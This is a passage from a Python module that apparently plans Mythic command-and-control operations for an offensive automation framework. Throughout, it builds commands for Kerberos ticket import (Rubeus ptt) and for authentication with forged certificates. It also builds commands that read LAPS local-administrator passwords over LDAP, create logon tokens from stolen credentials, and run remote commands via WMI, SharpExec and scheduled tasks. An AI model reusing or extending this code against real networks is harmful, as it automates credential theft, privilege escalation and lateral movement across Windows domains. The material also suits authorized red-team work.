            reason="certificate PKINIT adapter needs a managed Kerberos tool",
        )
    command = _dotnet_tool_command(step, config, tool_name, " ".join(pieces))
    if not command.ok:
        return command
    return _plan_with_terminal_artifacts(
        command,
        produces=["kerberos_ticket_base64", "certificate_pkinit_credentials"],
    )


def _certificate_schannel_ldap_proof_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    domain = _normalize(parameters.get("domain") or parameters.get("realm"))
    account = _text(parameters.get("account") or parameters.get("user") or parameters.get("principal"))
    certificate = _text(
        parameters.get("certificate_path")
        or parameters.get("forged_pfx_path")
        or parameters.get("pfx_path")
    )
    certificate_password = _text(
        parameters.get("certificate_password")
        or parameters.get("forged_pfx_password")
        or parameters.get("pfx_password")
    )
    domain_controller = _text(
        parameters.get("domain_controller")
        or parameters.get("dc")
        or parameters.get("ldap_server")
        or domain
    )
    search_base = _text(parameters.get("search_base") or parameters.get("base_dn") or _domain_dn(domain))
    proof_marker = _text(parameters.get("proof_marker") or "SAGE_CERT_AUTH_PROOF")
    missing = []
    if not domain:
        missing.append("domain")
    if not account:
        missing.append("account")
    if not certificate:
        missing.append("certificate")
    if not domain_controller:
        missing.append("domain_controller")
    if not search_base:
        missing.append("search_base")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="Schannel LDAP certificate-auth proof needs domain, account, certificate, and domain controller",
        )

    script = _certificate_schannel_ldap_powershell(
        domain=domain,
        account=account,
        certificate_path=certificate,
        certificate_password=certificate_password,
        domain_controller=domain_controller,
        search_base=search_base,
        proof_marker=proof_marker,
    )
    command = _adapter_text(config, "certificate_schannel_command", _adapter_text(config, "powershell_command", "powerpick"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["certificate_schannel_command"],
            reason="Schannel LDAP proof adapter needs a Mythic PowerShell command",
        )
    raw_script = _input_bool(config, "certificate_schannel_raw_script", default=True)
    mythic_parameters: Any = script if raw_script else {
        _adapter_text(config, "certificate_schannel_script_param", "script"): script,
    }
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            consumes=["forged_certificate_pfx"],
            produces=["certificate_schannel_ldap_probe"],
        ),
    ])


def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    command = _adapter_text(config, "logon_session_command", "make_token")
    if not command:
        return MythicCapabilityCommandPlan(False, missing=["logon_session_command"], reason="no logon-session command")

    domain = _text(parameters.get("domain"))
    user = _text(parameters.get("user") or "Administrator")
    password = _text(parameters.get("password") or "SageNetOnlyContext1!")
    username = f"{domain}\\{user}" if domain and "\\" not in user and "@" not in user else user
    netonly_param = _adapter_text(config, "logon_netonly_param", "netOnly")
    credential_param = _adapter_text(config, "logon_credential_param", "credential")
    logon_credential_id = _text(
        parameters.get("logon_credential_id")
        or parameters.get("netonly_credential_id")
        or parameters.get("sacrificial_credential_id")
    )
    mode = _normalize(config.get("logon_session_mode") or config.get("logon_strategy") or "credential-store")
    mythic_parameters: dict[str, Any] = {}
    if mode in {"direct", "username-password", "newcredentials"} or not credential_param:
        mythic_parameters = {
            _adapter_text(config, "logon_username_param", "username"): username,
            _adapter_text(config, "logon_password_param", "password"): password,
        }
        if netonly_param:
            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
    else:
        mythic_parameters[credential_param] = (
            {
                "id": logon_credential_id,
                "account": user,
                "realm": domain,
                "credential": password,
                "type": "plaintext",
            }
            if logon_credential_id
            else {
                "account": user,
                "realm": domain,
                "credential": password,
                "type": "plaintext",
            }
        )
        if netonly_param:
            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
    process_param = _adapter_text(config, "logon_process_param", "")
    process = _text(parameters.get("process"))
    if process_param and process:
        mythic_parameters[process_param] = process
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, command, mythic_parameters, produces=["kerberos_logon_context"]),
    ])


def _kerberos_ticket_import_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    agent_cache = _uses_agent_kerberos_cache(parameters)
    provider = operation_providers.select_operation_provider(
        "kerberos-ticket-import",
        config=config,
        context="current-agent-cache" if agent_cache else "isolated",
    )
    if provider is None:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos-ticket-import-provider"],
            reason="no provider preserves the requested Kerberos ticket import context",
        )

    ticket_value = _text(
        parameters.get("ticket_base64")
        or parameters.get("base64ticket")
        or parameters.get("ticket_artifact")
        or "{{kerberos_ticket_base64}}"
    )
    if provider.name == "managed-rubeus-ptt":
        translated = _inprocess_dotnet_tool_command(
            step,
            config,
            provider,
            provider.tool,
            f"ptt /ticket:{_rubeus_value(ticket_value)}",
        )
        if not translated.ok:
            return translated
        if len(translated.commands) < 2:
            return MythicCapabilityCommandPlan(
                False,
                missing=["inprocess_dotnet_commands"],
                reason="managed current-session ticket import needs load and invoke commands",
            )
        return MythicCapabilityCommandPlan(True, commands=[
            translated.commands[0],
            _command_with_artifacts(
                translated.commands[1],
                consumes=(
                    ["kerberos_ticket_base64"]
                    if agent_cache else
                    ["kerberos_ticket_base64", "kerberos_logon_context"]
                ),
                produces=["kerberos_ticket_imported"],
                deferred="{{" in ticket_value,
            ),
        ])

    command = provider.command
    domain = _text(parameters.get("domain"))
    user = _text(parameters.get("user") or "Administrator")
    mythic_parameters: dict[str, Any] = {
        _adapter_text(config, "ticket_base64_param", "base64ticket"): ticket_value,
    }
    existing_ticket_param = _adapter_text(config, "ticket_existing_credential_param", "")
    if existing_ticket_param and not agent_cache:
        mythic_parameters[existing_ticket_param] = {
            "account": user,
            "realm": domain,
            "credential": ticket_value,
            "type": "ticket",
        }
    luid_param = _adapter_text(config, "ticket_luid_param", "luid")
    target_context = _text(parameters.get("target_context"))
    if luid_param and target_context and not target_context.startswith("{{") and not agent_cache:
        mythic_parameters[luid_param] = target_context
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            consumes=["kerberos_ticket_base64"] if agent_cache else [
                "kerberos_ticket_base64",
                "kerberos_logon_context",
            ],
            produces=["kerberos_ticket_imported"],
            deferred="{{" in ticket_value,
        ),
    ])


def _kerberos_ticket_list_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_context = _text(parameters.get("target_context"))
    current_context = _is_current_kerberos_context(target_context)
    agent_cache = _uses_agent_kerberos_cache(parameters)
    provider = operation_providers.select_operation_provider(
        "kerberos-ticket-list",
        config=config,
        context=_kerberos_operation_context(current_context, agent_cache),
    )
    if provider is None:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos-ticket-list-provider"],
            reason="no provider preserves the requested Kerberos ticket-list context",
        )
    if provider.name == "native-current-ticket-cache-list":
        return MythicCapabilityCommandPlan(True, commands=[
            _command_from_step(
                step,
                provider.command,
                {"luid": "", "getSystemTickets": False},
                consumes=["kerberos_ticket_imported"],
                produces=["kerberos_context_inventory"],
            ),
        ])
    if provider.name == "managed-rubeus-klist":
        translated = _inprocess_dotnet_tool_command(
            step,
            config,
            provider,
            provider.tool,
            provider.arguments or "klist",
        )
        if not translated.ok:
            return translated
        if len(translated.commands) < 2:
            return MythicCapabilityCommandPlan(
                False,
                missing=["inprocess_dotnet_commands"],
                reason="managed current-session ticket inventory needs load and invoke commands",
            )
        return MythicCapabilityCommandPlan(True, commands=[
            translated.commands[0],
            _command_with_artifacts(
                translated.commands[1],
                consumes=[] if current_context else ["kerberos_logon_context"],
                produces=["kerberos_context_inventory"],
            ),
        ])
    if provider.name == "windows-klist-list":
        consumes = [] if current_context else ["kerberos_logon_context"]
        if _normalize(provider.command) == "run":
            return _run_command(
                step,
                config,
                provider.executable,
                provider.arguments,
                command=provider.command,
                consumes=consumes,
                produces=["kerberos_context_inventory"],
            )
        raw_shell = _normalize(provider.command) == "shell" and _input_bool(config, "current_ticket_list_raw_shell", default=True)
        shell_command = _adapter_text(config, "current_ticket_list_shell", "klist")
        mythic_parameters: Any
        if raw_shell:
            mythic_parameters = shell_command
        else:
            command_param = _adapter_text(config, "current_ticket_list_param", "command")
            mythic_parameters = {command_param: shell_command}
        return MythicCapabilityCommandPlan(True, commands=[
            _command_from_step(
                step,
                provider.command,
                mythic_parameters,
                consumes=consumes,
                produces=["kerberos_context_inventory"],
            ),
        ])

    mythic_parameters: dict[str, Any] = {}
    luid_param = _adapter_text(config, "ticket_luid_param", "luid")
    if luid_param and target_context and not target_context.startswith("{{") and not current_context:
        mythic_parameters[luid_param] = target_context
    elif luid_param and _input_bool(config, "ticket_list_emit_empty_luid", default=True):
        mythic_parameters[luid_param] = ""
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, provider.command, mythic_parameters, consumes=["kerberos_logon_context"]),
    ])


def _kerberos_ticket_purge_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_context = _text(parameters.get("target_context"))
    current_context = _is_current_kerberos_context(target_context)
    agent_cache = _uses_agent_kerberos_cache(parameters)
    provider = operation_providers.select_operation_provider(
        "kerberos-ticket-purge",
        config=config,
        context=_kerberos_operation_context(current_context, agent_cache),
    )
    if provider is None:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos-ticket-purge-provider"],
            reason="no provider preserves the requested Kerberos ticket-purge context",
        )
    if provider.name == "native-current-ticket-cache-purge":
        return MythicCapabilityCommandPlan(True, commands=[
            _command_from_step(
                step,
                provider.command,
                {"all": True, "serviceName": "", "luid": ""},
                consumes=[],
                produces=["kerberos_current_tickets_purged"],
            ),
        ])
    if provider.name == "windows-klist-purge":
        if _normalize(provider.command) == "run":
            return _run_command(
                step,
                config,
                provider.executable,
                provider.arguments,
                command=provider.command,
                consumes=[],
                produces=["kerberos_current_tickets_purged"],
            )
        raw_shell = _normalize(provider.command) == "shell" and _input_bool(config, "current_ticket_purge_raw_shell", default=True)
        shell_command = _adapter_text(config, "current_ticket_purge_shell", "klist purge")
        mythic_parameters: Any
        if raw_shell:
            mythic_parameters = shell_command
        else:
            command_param = _adapter_text(config, "current_ticket_purge_param", "command")
            mythic_parameters = {command_param: shell_command}
        return MythicCapabilityCommandPlan(True, commands=[
            _command_from_step(
                step,
                provider.command,
                mythic_parameters,
                consumes=[],
                produces=["kerberos_current_tickets_purged"],
            ),
        ])

    mythic_parameters: dict[str, Any] = {}
    luid_param = _adapter_text(config, "ticket_luid_param", "luid")
    if luid_param and target_context and not target_context.startswith("{{") and not current_context:
        mythic_parameters[luid_param] = target_context
    elif luid_param and _input_bool(config, "ticket_purge_emit_empty_luid", default=True):
        mythic_parameters[luid_param] = ""
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            provider.command,
            mythic_parameters,
            consumes=["kerberos_logon_context"],
            produces=["kerberos_ticket_store_purged"],
        ),
    ])


def _kerberos_service_ticket_acquire_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_context = _text(parameters.get("target_context"))
    current_context = _is_current_kerberos_context(target_context)
    agent_cache = _uses_agent_kerberos_cache(parameters)
    provider = operation_providers.select_operation_provider(
        "kerberos-service-ticket-acquire",
        config=config,
        context=_kerberos_operation_context(current_context, agent_cache),
    )
    if provider is None:
        return MythicCapabilityCommandPlan(
            False,
            missing=["kerberos-service-ticket-acquire-provider"],
            reason="no provider preserves the requested Kerberos service-ticket acquisition context",
        )

    service = _kerberos_service_ticket_spn(
        parameters.get("service")
        or parameters.get("spn")
        or parameters.get("resource")
        or parameters.get("proof_resource")
        or parameters.get("service_resource")
        or "{{kerberos_service_resource}}",
    )
    if not service:
        return MythicCapabilityCommandPlan(
            False,
            missing=["service"],
            reason="Kerberos service-ticket acquisition needs a target service",
        )

    consumes = ["kerberos_current_tickets_purged"]
    deferred = "{{" in service
    if deferred:
        consumes.append("kerberos_service_resource")
    if provider.name == "windows-klist-get":
        if _normalize(provider.command) == "run":
            return _run_command(
                step,
                config,
                provider.executable,
                f"get {service}",
                command=provider.command,
                consumes=consumes,
                produces=["kerberos_service_ticket_acquired"],
                deferred=deferred,
            )
        shell_command = f"{provider.executable} get {service}"
        return _shell_command(
            step,
            config,
            shell_command,
            consumes=consumes,
            produces=["kerberos_service_ticket_acquired"],
            deferred=deferred,
        )

    return MythicCapabilityCommandPlan(
        False,
        missing=["kerberos-service-ticket-acquire-provider"],
        reason=f"unsupported Kerberos service-ticket acquisition provider: {provider.name}",
    )


def _kerberos_context_service_proof_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    resource = _service_access_resource(
        parameters.get("resource")
        or parameters.get("proof_resource")
        or parameters.get("service_resource")
        or "{{kerberos_service_resource}}",
    )
    if not resource:
        return MythicCapabilityCommandPlan(
            False,
            missing=["resource"],
            reason="Kerberos service proof needs a target service resource",
        )

    command = _adapter_text(config, "service_access_command", "shell")
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["service_access_command"],
            reason="Kerberos service proof needs a Mythic command",
        )

    raw_shell = command == "shell" and _input_bool(config, "service_access_raw_shell", default=True)
    if raw_shell:
        verb = _adapter_text(config, "service_access_shell_verb", "dir")
        proof_marker = _text(parameters.get("proof_marker") or parameters.get("auth_marker") or parameters.get("marker"))
        expected_probe = _text(getattr(step, "expected_probe", ""))
        if proof_marker and expected_probe == "extract_adcs_certificate_auth_probe":
            mythic_parameters: Any = f"echo {proof_marker} & {verb} {resource}"
        else:
            mythic_parameters = f"{verb} {resource}"
    else:
        path_param = _adapter_text(config, "service_access_path_param", "path")
        mythic_parameters = {path_param: resource}

    target_context = _text(parameters.get("target_context"))
    current_context = _is_current_kerberos_context(target_context)
    requires_import = _input_bool(parameters, "requires_import", default=not current_context)
    if current_context and not requires_import:
        consumes = ["kerberos_context_inventory"]
        if _input_bool(parameters, "requires_acquisition", default=False):
            consumes.append("kerberos_service_ticket_acquired")
    else:
        consumes = ["kerberos_ticket_imported", "kerberos_logon_context"]
    deferred = "{{" in resource
    if deferred:
        consumes.append("kerberos_service_resource")
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            consumes=consumes,
            produces=["kerberos_service_access_probe"],
            deferred=deferred,
        ),
    ])


def _ldap_managed_local_admin_secret_read_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    target_domain = _normalize(parameters.get("target_domain") or parameters.get("domain") or parameters.get("realm"))
    if not target_domain:
        _, target_domain = _host_domain_from_target(parameters.get("target_host") or parameters.get("host"))
    domain_controller = _text(parameters.get("domain_controller") or parameters.get("dc") or target_domain)
    search_base = _text(parameters.get("search_base") or parameters.get("base_dn") or _domain_dn(target_domain))
    missing = []
    if not target_host:
        missing.append("target_host")
    if not target_domain:
        missing.append("target_domain")
    if not search_base:
        missing.append("search_base")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="managed-local-admin secret adapter needs target host/domain and LDAP search base",
        )

    attributes = _string_list(parameters.get("attributes")) or [
        "ms-Mcs-AdmPwd",
        "ms-Mcs-AdmPwdExpirationTime",
        "msLAPS-Password",
        "msLAPS-EncryptedPassword",
        "msLAPS-PasswordExpirationTime",
        "distinguishedName",
        "dNSHostName",
        "sAMAccountName",
    ]
    provider = operation_providers.select_operation_provider(
        "ldap-managed-local-admin-secret-read",
        config=config,
        context="current-agent-cache",
    )
    if provider is not None and provider.name == "managed-sharpview-computer-attribute-read":
        translated = _inprocess_dotnet_tool_command(
            step,
            config,
            provider,
            provider.tool,
            _sharpview_managed_secret_args(
                target_host,
                target_domain,
                domain_controller,
                search_base,
                attributes,
            ),
        )
        if not translated.ok:
            return translated
        if len(translated.commands) < 2:
            return MythicCapabilityCommandPlan(
                False,
                missing=["inprocess_dotnet_commands"],
                reason="managed current-session directory read needs load and invoke commands",
            )
        return MythicCapabilityCommandPlan(True, commands=[
            replace(translated.commands[0], expected_probe=""),
            _command_with_artifacts(
                translated.commands[1],
                consumes=["kerberos_account_context"],
                produces=["managed_local_admin_secret_probe"],
            ),
        ])

    script = _managed_secret_powershell(domain_controller, search_base, target_host, target_domain, attributes)
    command = _adapter_text(config, "managed_secret_read_command", _adapter_text(config, "ldap_query_command", "powerpick"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["managed_secret_read_command"],
            reason="managed-local-admin secret adapter needs a Mythic LDAP/query command",
        )

    raw_script = _input_bool(config, "managed_secret_read_raw_script", default=True)
    if raw_script:
        mythic_parameters: Any = script
    else:
        mythic_parameters = {_adapter_text(config, "managed_secret_script_param", "script"): script}
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            consumes=["kerberos_account_context"],
            produces=["managed_local_admin_secret_probe"],
        ),
    ])


def _local_admin_logon_session_create_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    local_account = _text(
        parameters.get("local_account")
        or parameters.get("local_user")
        or parameters.get("username")
        or parameters.get("user")
        or "Administrator"
    )
    password = _text(
        parameters.get("password")
        or parameters.get("local_admin_password")
        or parameters.get("managed_local_admin_secret")
        or parameters.get("secret")
        or parameters.get("credential")
    )
    missing = []
    if not target_host:
        missing.append("target_host")
    if not local_account:
        missing.append("local_account")
    if not password:
        missing.append("password")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="local-admin logon adapter needs target host, local account, and password",
        )

    command = _adapter_text(config, "local_admin_logon_command", _adapter_text(config, "logon_session_command", "make_token"))
    if not command:
        return MythicCapabilityCommandPlan(False, missing=["local_admin_logon_command"], reason="no local-admin logon command")

    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    username = f"{realm}\\{local_account}" if realm and "\\" not in local_account and "@" not in local_account else local_account
    netonly_param = _adapter_text(config, "logon_netonly_param", "netOnly")
    credential_param = _adapter_text(config, "logon_credential_param", "credential")
    credential_id = _text(
        parameters.get("local_admin_credential_id")
        or parameters.get("managed_local_admin_credential_id")
        or parameters.get("credential_id")
    )
    mode = _normalize(config.get("logon_session_mode") or config.get("local_admin_logon_mode") or "credential-store")
    mythic_parameters: dict[str, Any]
    if mode in {"direct", "username-password", "newcredentials"} or not credential_param:
        mythic_parameters = {
            _adapter_text(config, "logon_username_param", "username"): username,
            _adapter_text(config, "logon_password_param", "password"): password,
        }
        if netonly_param:
            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
    else:
        mythic_parameters = {
            credential_param: (
                {
                    "id": credential_id,
                    "account": local_account,
                    "realm": realm,
                    "credential": password,
                    "type": "plaintext",
                }
                if credential_id
                else {
                    "account": local_account,
                    "realm": realm,
                    "credential": password,
                    "type": "plaintext",
                }
            ),
        }
        if netonly_param:
            mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
    process_param = _adapter_text(config, "logon_process_param", "")
    process = _text(parameters.get("process"))
    if process_param and process:
        mythic_parameters[process_param] = process
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, command, mythic_parameters, produces=["local_admin_logon_context"]),
    ])


def _local_admin_service_proof_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    target_domain = _normalize(parameters.get("target_domain") or parameters.get("domain") or parameters.get("realm"))
    if not target_domain:
        _, target_domain = _host_domain_from_target(parameters.get("target_host") or parameters.get("host"))
    resource = _service_access_resource(
        parameters.get("resource")
        or parameters.get("proof_resource")
        or parameters.get("service_resource")
        or (_host_fqdn(target_host, target_domain) if target_host else "")
    )
    if not resource:
        return MythicCapabilityCommandPlan(
            False,
            missing=["resource"],
            reason="local-admin service proof needs a target service resource",
        )

    command = _adapter_text(config, "local_admin_service_access_command", _adapter_text(config, "file_list_command", "ls"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["local_admin_service_access_command"],
            reason="local-admin service proof needs a Mythic command",
        )

    raw_shell = command == "shell" and _input_bool(config, "service_access_raw_shell", default=True)
    if raw_shell:
        verb = _adapter_text(config, "service_access_shell_verb", "dir")
        mythic_parameters: Any = f"{verb} {resource}"
    else:
        path_param = _adapter_text(config, "service_access_path_param", "path")
        mythic_parameters = {path_param: resource}
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(
            step,
            command,
            mythic_parameters,
            consumes=["local_admin_logon_context"],
            produces=["local_admin_access_probe"],
            deferred="{{" in resource,
        ),
    ])


def _local_admin_remote_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
    parameters = getattr(step, "parameters", {}) if isinstance(getattr(step, "parameters", {}), dict) else {}
    target_host = _short_host(parameters.get("target_host") or parameters.get("host") or parameters.get("computer"))
    target_domain = _normalize(parameters.get("target_domain") or parameters.get("domain") or parameters.get("realm"))
    if not target_domain:
        _, target_domain = _host_domain_from_target(parameters.get("target_host") or parameters.get("host"))
    host = _host_fqdn(target_host, target_domain)
    local_account = _text(
        parameters.get("local_account")
        or parameters.get("local_user")
        or parameters.get("username")
        or parameters.get("user")
        or "Administrator"
    )
    password = _text(
        parameters.get("password")
        or parameters.get("local_admin_password")
        or parameters.get("managed_local_admin_secret")
        or parameters.get("secret")
        or parameters.get("credential")
    )
    command_text = _text(parameters.get("command") or parameters.get("remote_command"))
    missing = []
    if not host:
        missing.append("target_host")
    if not local_account:
        missing.append("local_account")
    if not password:
        missing.append("password")
    if not command_text:
        missing.append("command")
    if missing:
        return MythicCapabilityCommandPlan(
            False,
            missing=missing,
            reason="local-admin remote execution adapter needs target host, local account, password, and command",
        )

    command = _adapter_text(config, "local_admin_remote_exec_command", _adapter_text(config, "remote_exec_command", "wmiexecute"))
    if not command:
        return MythicCapabilityCommandPlan(
            False,
            missing=["local_admin_remote_exec_command"],
            reason="local-admin remote execution adapter needs a Mythic command",
        )
    if (
        _normalize(command) in {"wmiexec", "wmiexecute"}
        and _input_bool(config, "local_admin_remote_exec_use_token_context", default=False)
    ):
        return _local_admin_token_wmiexecute_commands(
            step,
            config,
            parameters,
            command,
            host,
            local_account,
            password,
            command_text,
        )
    if _normalize(command) in {"execute_assembly", "inline_assembly", "execute-assembly"}:
        tool_name = _adapter_text(config, "remote_exec_tool", "SharpExec.exe")
        method = _normalize(parameters.get("method") or "wmiexec")
        realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
        args = " ".join([
            f"-m={method or 'wmiexec'}",
            f"-i={_quote_cli(host)}",
            f"-u={_quote_cli(local_account)}",
            f"-p={_quote_cli(password)}",
            f"-d={_quote_cli(realm)}",
            f"-c={_quote_cli(command_text)}",
        ])
        translated = _dotnet_tool_command(
            step,
            {**config, "dotnet_runner_command": command},
            tool_name,
            args,
        )
        if not translated.ok:
            return translated
        return _plan_with_terminal_artifacts(translated, produces=["remote_process_created"])
    if _normalize(command) in {"shell"}:
        shell_args = _native_windows_remote_exec_shell(parameters, config)
        if not shell_args:
            return MythicCapabilityCommandPlan(
                False,
                missing=["shell_arguments"],
                reason="native shell remote execution adapter needs target host, local account, password, proof path, and proof marker",
            )
        shell_param = _adapter_text(config, "shell_arguments_param", "arguments")
        return MythicCapabilityCommandPlan(True, commands=[
            MythicCapabilityCommand(
                command=command,
                parameters={shell_param: shell_args},
                capability=_text(getattr(step, "capability", "")),
                purpose=_text(getattr(step, "purpose", "")),
                expected_probe="extract_remote_execution_probe",
                prerequisites=list(getattr(step, "prerequisites", []) or []),
                produces=["remote_process_created", "remote_execution_proof"],
            )
        ])
    if _normalize(command) in {"run"}:
        run_commands = _native_windows_remote_exec_run_commands(step, command, parameters, config)
        if not run_commands:
            return MythicCapabilityCommandPlan(
                False,
                missing=["run_arguments"],
                reason="native run remote execution adapter needs target host, local account, password, proof path, and proof marker",
            )
        return MythicCapabilityCommandPlan(True, commands=run_commands)

    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    mythic_parameters = {
        _adapter_text(config, "remote_exec_command_param", "command"): command_text,
        _adapter_text(config, "remote_exec_host_param", "host"): host,
        _adapter_text(config, "remote_exec_username_param", "username"): local_account,
        _adapter_text(config, "remote_exec_password_param", "password"): password,
        _adapter_text(config, "remote_exec_domain_param", "domain"): realm,
    }
    return MythicCapabilityCommandPlan(True, commands=[
        _command_from_step(step, command, mythic_parameters, produces=["remote_process_created"]),
    ])


def _local_admin_token_wmiexecute_commands(
    step: Any,
    config: dict[str, Any],
    parameters: dict[str, Any],
    command: str,
    host: str,
    local_account: str,
    password: str,
    command_text: str,
    *,
    expected_probe: str | None = None,
    purpose: str | None = None,
) -> MythicCapabilityCommandPlan:
    realm = _text(parameters.get("local_realm") or parameters.get("realm") or _short_host(host))
    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
    capability = _text(getattr(step, "capability", ""))
    prerequisites = list(getattr(step, "prerequisites", []) or [])
    commands: list[MythicCapabilityCommand] = []
    if not _input_bool(config, "local_admin_remote_exec_reuse_token_context", default=False):
        make_token = _adapter_text(config, "local_admin_context_command", _adapter_text(config, "make_token_command", "make_token"))
        if not make_token:
            return MythicCapabilityCommandPlan(
                False,
                missing=["local_admin_context_command"],
                reason="token-backed Apollo WMI execution needs a local-admin context command",
            )
        commands.append(
            MythicCapabilityCommand(
                command=make_token,
                parameters=_make_token_parameters(config, principal, local_account, realm, password),
                capability=capability,
                purpose="create a network logon context for hardened Apollo WMI activation",
                expected_probe="",
                prerequisites=prerequisites,
                produces=["local_admin_logon_context"],
            )
        )
    commands.append(
        MythicCapabilityCommand(
            command=command,
            parameters={
                _adapter_text(config, "remote_exec_command_param", "command"): command_text,
                _adapter_text(config, "remote_exec_host_param", "host"): host,
            },
            capability=capability,
            purpose=_text(getattr(step, "purpose", "")) if purpose is None else purpose,
            expected_probe=_text(getattr(step, "expected_probe", "")) if expected_probe is None else expected_probe,
            prerequisites=prerequisites,
            consumes=["local_admin_logon_context"],
            produces=["remote_process_created"],
        )
    )
    return MythicCapabilityCommandPlan(True, commands=commands)


def _native_windows_remote_exec_run_commands(
    step: Any,
    command: str,
    parameters: dict[str, Any],
    config: dict[str, Any],
) -> list[MythicCapabilityCommand]:
    target_host = _short_host(parameters.get("target_host"))
    target_domain = _normalize(parameters.get("target_domain"))
    local_account = _text(parameters.get("local_account") or parameters.get("username") or "Administrator")
    password = _text(parameters.get("password"))
    proof_marker = _text(parameters.get("proof_marker"))
    proof_path = _text(parameters.get("proof_path") or r"C:\Windows\Temp\sage_remote_exec.txt")
    if not target_host or not local_account or not password or not proof_marker or not proof_path:
        return []
    host = _host_fqdn(target_host, target_domain)
    share_host = _adapter_text(config, "native_remote_exec_share_host", target_host) or target_host
    realm = _text(parameters.get("local_realm") or parameters.get("realm") or target_host)
    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
    share = f"\\\\{share_host}\\C$"
    proof_unc = _unc_from_windows_path(share_host, proof_path)
    remote_command = _text(parameters.get("command") or parameters.get("remote_command")) or _native_windows_probe_command(proof_marker, proof_path)
    wait_count = _adapter_text(config, "native_remote_exec_wait_ping_count", "6") or "6"
    exe_param = _adapter_text(config, "run_executable_param", "executable")
    args_param = _adapter_text(config, "run_arguments_param", "arguments")
    capability = _text(getattr(step, "capability", ""))
    prerequisites = list(getattr(step, "prerequisites", []) or [])
    method = _normalize(config.get("native_remote_exec_method") or parameters.get("method") or "")
    if method in {"make-token", "make_token", "token", "netonly"}:
        make_token = _adapter_text(config, "local_admin_context_command", _adapter_text(config, "make_token_command", "make_token"))
        revert = _adapter_text(config, "revert_command", _adapter_text(config, "rev2self_command", "rev2self"))
        runner = _adapter_text(config, "native_remote_exec_runner_command", command)
        runner_is_shell = _normalize(runner) == "shell"
        transport = _normalize(
            config.get("native_remote_exec_transport")
            or config.get("native_remote_exec_remote_method")
            or config.get("remote_exec_transport")
            or "wmic"
        )
        if runner_is_shell and transport in {"scheduled-task", "scheduled_task", "schtasks", "task-scheduler", "taskscheduler"}:
            task_name = _adapter_text(config, "native_remote_exec_task_name", "") or _scheduled_task_name(proof_marker)
            remote_parameters: Any = _native_windows_scheduled_task_command(
                host=host,
                task_name=task_name,
                remote_command=remote_command,
                proof_unc=proof_unc,
                wait_count=wait_count,
            )
            commands = [
                MythicCapabilityCommand(
                    command=make_token,
                    parameters=_make_token_parameters(config, principal, local_account, realm, password),
                    capability=capability,
                    purpose="create a sacrificial network logon context for the selected local-admin credential",
                    expected_probe="",
                    prerequisites=prerequisites,
                    produces=["local_admin_logon_context"],
                ),
                MythicCapabilityCommand(
                    command=runner,
                    parameters=remote_parameters,
                    capability=capability,
                    purpose=_text(getattr(step, "purpose", "")),
                    expected_probe="extract_remote_execution_probe",
                    prerequisites=prerequisites,
                    consumes=["local_admin_logon_context"],
